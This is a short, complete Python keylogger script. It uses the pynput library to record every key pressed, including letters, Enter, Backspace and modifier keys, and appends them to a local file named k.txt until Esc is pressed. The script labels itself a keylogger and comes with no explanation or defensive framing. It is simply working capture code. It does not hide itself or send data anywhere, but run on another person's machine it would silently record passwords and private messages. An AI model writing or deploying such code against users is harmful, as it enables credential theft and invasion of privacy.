from pynput.keyboard import Listener, Key

def file(key):
    with open("k.txt", "a") as f:
        if key == Key.esc:
            f.write("Stopping Keylogger\n")
            return False

        elif key == Key.enter:
            f.write("\n")

        elif key == Key.space:
            f.write(" ")

        elif key == Key.backspace:
            f.write("[BACKSPACE]")

        elif key == Key.tab:
            f.write("\t")

        elif key == Key.shift:
            f.write("[SHIFT]")

        elif key == Key.ctrl:
            f.write("[CTRL]")

        elif key == Key.alt:
            f.write("[ALT]")

        elif hasattr(key, 'char') and key.char is not None:
            f.write(key.char)

        else:
            f.write(f"[{key}] ")

with Listener(on_press=file) as listener:
    listener.join()
